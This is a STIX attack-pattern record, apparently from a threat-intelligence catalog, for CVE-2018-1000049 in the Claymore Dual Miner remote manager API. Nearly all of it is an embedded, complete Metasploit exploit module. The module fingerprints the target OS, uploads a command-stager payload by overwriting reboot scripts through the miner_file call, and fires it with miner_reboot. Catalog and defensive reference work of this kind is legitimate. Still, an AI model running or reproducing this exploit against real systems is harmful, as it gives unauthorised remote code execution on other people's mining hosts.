{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba2162b5-2ea7-45ac-89fc-3045ec458deb",
    "created": "2024-08-14T17:06:35.909194Z",
    "modified": "2024-08-14T17:06:35.909198Z",
    "name": "Nanopool Claymore Dual Miner APIs RCE",
    "description": " This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/claymore_dual_miner_remote_manager_rce.rb",
            "external_id": "claymore_dual_miner_remote_manager_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1000049"
        },
        {
            "source_name": "reference",
            "url": "https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Nanopool Claymore Dual Miner APIs RCE',\n      'Description'     => %q{\n        This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability.\n      },\n      'Author'          =>\n        [\n          'reversebrain@snado', # Vulnerability reporter\n          'phra@snado'          # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          ['EDB', '44638'],\n          ['CVE', '2018-1000049'],\n          ['URL', 'https://reversebrain.github.io/2018/02/01/Claymore-Dual-Miner-Remote-Code-Execution/']\n        ],\n      'Platform'        => ['win', 'linux'],\n      'Targets'         =>\n        [\n          [ 'Automatic Target', { 'auto' => true }],\n          [ 'Linux',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X64,\n              'CmdStagerFlavor' => [ 'bourne', 'echo', 'printf' ]\n            }\n          ],\n          [ 'Windows',\n            {\n              'Platform' => 'windows',\n              'Arch' => ARCH_X64,\n              'CmdStagerFlavor' => [ 'certutil', 'vbs' ]\n            }\n          ]\n        ],\n      'Payload' =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DisclosureDate'  => '2018-02-09',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [ true, 'Set miner port', 3333 ])\n      ])\n    deregister_options('URIPATH', 'SSL', 'SSLCert', 'SRVPORT', 'SRVHOST')\n  end\n\n  def select_target\n    data = {\n      \"id\"      => 0,\n      \"jsonrpc\" => '2.0',\n      \"method\"  => 'miner_getfile',\n      \"params\"  => ['config.txt']\n    }.to_json\n    connect\n    sock.put(data)\n    buf = sock.get_once || ''\n    tmp = StringIO.new\n    tmp << buf\n    tmp2 = tmp.string\n    hex = ''\n    if tmp2.scan(/\\w+/)[7]\n      return self.targets[2]\n    elsif tmp2.scan(/\\w+/)[5]\n      return self.targets[1]\n    else\n      return nil\n    end\n  end\n\n  def check\n    target = select_target\n    if target.nil?\n      return Exploit::CheckCode::Safe\n    end\n    data = {\n      \"id\"      => 0,\n      \"jsonrpc\" => '2.0',\n      \"method\"  => 'miner_getfile',\n      \"params\"  => ['config.txt']\n    }.to_json\n    connect\n    sock.put(data)\n    buf = sock.get_once || ''\n    tmp = StringIO.new\n    tmp << buf\n    tmp2 = tmp.string\n    hex = ''\n    case target['Platform']\n    when 'linux'\n      hex = tmp2.scan(/\\w+/)[5]\n    when 'windows'\n      hex = tmp2.scan(/\\w+/)[7]\n    end\n    str = Rex::Text.hex_to_raw(hex)\n    if str.include?('WARNING')\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Detected\n    end\n  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n    vprint_error(e.message)\n    return Exploit::CheckCode::Unknown\n  ensure\n    disconnect\n  end\n\n  def execute_command(cmd, opts = {})\n    target = select_target\n    case target['Platform']\n    when 'linux'\n      cmd = Rex::Text.to_hex(cmd, '')\n      upload = {\n        \"id\"      => 0,\n        \"jsonrpc\" => '2.0',\n        \"method\"  => 'miner_file',\n        \"params\"  => ['reboot.bash', \"#{cmd}\"]\n      }.to_json\n    when 'windows'\n      cmd = Rex::Text.to_hex(cmd_psh_payload(payload.encoded, payload_instance.arch.first), '')\n      upload = {\n        \"id\"      => 0,\n        \"jsonrpc\" => '2.0',\n        \"method\"  => 'miner_file',\n        \"params\"  => ['reboot.bat', \"#{cmd}\"]\n      }.to_json\n    end\n\n    connect\n    sock.put(upload)\n    buf = sock.get_once || ''\n    trigger_vulnerability\n  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  ensure\n    disconnect\n  end\n\n  def trigger_vulnerability\n    execute = {\n      \"id\"      => 0,\n      \"jsonrpc\" => '2.0',\n      \"method\"  => 'miner_reboot'\n    }.to_json\n    connect\n    sock.put(execute)\n    buf = sock.get_once || ''\n    disconnect\n  end\n\n  def exploit\n    target = select_target\n    if target.nil?\n      fail_with(Failure::NoTarget, 'No matching target')\n    end\n    if (target['Platform'].eql?('linux') && payload_instance.name !~ /linux/i) ||\n      (target['Platform'].eql?('windows') && payload_instance.name !~ /windows/i)\n      fail_with(Failure::BadConfig, \"Selected payload '#{payload_instance.name}' is not compatible with target operating system '#{target.name}'\")\n    end\n    case target['Platform']\n    when 'linux'\n      execute_cmdstager(flavor: :echo, linemax: 100000)\n    when 'windows'\n      execute_cmdstager(flavor: :vbs, linemax: 100000)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-02-09",
    "x_mitre_platforms": [
        "windows'"
    ]
}